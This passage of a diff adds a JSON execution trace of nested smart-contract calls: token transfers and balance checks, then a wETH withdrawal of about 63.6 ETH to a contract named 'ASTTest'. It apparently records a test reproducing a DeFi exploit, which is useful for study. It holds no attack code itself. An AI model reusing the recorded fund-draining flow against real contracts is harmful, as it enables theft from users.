+                    "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410, 20000407064566313222 [2e19]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "6783",
+                        "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                        "function": "transfer",
+                        "value": null,
+                        "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410, 20000407064566313222 [2e19]",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "id": "1226",
+                "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                "function": "balanceOf",
+                "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410",
+                "flag": 1,
+                "return_value": "358902607297407002714 [3.589e20]",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "529",
+                    "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                    "function": "balanceOf",
+                    "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410",
+                    "flag": 1,
+                    "return_value": "358902607297407002714 [3.589e20]",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "534",
+            "contract": "wETH",
+            "function": "balanceOf",
+            "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "63638748240147758427 [6.363e19]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "9195",
+            "contract": "wETH",
+            "function": "withdraw",
+            "args": "63638748240147758427 [6.363e19]",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "55",
+                "contract": "ASTTest",
+                "function": "receive",
+                "value": "value: 63638748240147758427",
+                "args": "",
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
